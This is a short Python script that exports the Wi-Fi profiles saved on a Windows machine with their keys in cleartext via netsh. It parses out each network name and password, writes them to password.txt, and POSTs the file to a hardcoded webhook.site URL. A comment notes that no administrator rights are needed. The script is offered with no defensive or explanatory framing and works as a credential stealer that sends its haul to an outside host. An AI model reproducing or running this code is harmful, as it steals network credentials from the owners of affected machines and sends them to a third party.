import os
import sys
import subprocess
import requests

url = 'https://webhook.site/e7b30935-5219-4d81-ab02-de74a585f038'
#creating a file
with open ("password.txt", "w") as p:
     p.write("here are the passwords:\n")

#lists
wifi_files = []
wifi_passwords = []
wifi_names = []

#running a command in cmd(NOTE: adminimstrator permission is not needed for this to run)
command = subprocess.run(["netsh", "wlan", "export", "profile" ,"key=clear"], capture_output=True).stdout.decode()

#shifting control to the currernt directory
path = os.getcwd()

#the scrapping and sending
for filename in os.listdir(path):
     if filename.startswith("Wi-Fi-"): #and filename.endswith(".xml")
          wifi_files.append(filename)
          for i in wifi_files:
               with open (i, "r") as f:
                    for line in f.readlines():
                         if 'name' in line :
                              stripped = line.strip()
                              front = stripped[6:]
                              back = front[:-7]
                              print(back)
                              wifi_names.append(back)
                            #  wifi_names.append(front)

                         if 'keyMaterial' in line:
                              kstripped = line.strip()
                              front = kstripped[13:] 
                              back = front[:-14]
                              print(back)
                              wifi_passwords.append(back)
                              for x,y in zip(wifi_names, wifi_passwords):
                                   sys.stdout = open("password.txt", "a")
                                   print("SSID: "+x, "password: "+y, sep='\n')
                                   sys.stdout.close()


#sending 
with open('password.txt', 'rb') as f:
     r = requests.post(url, data = f)
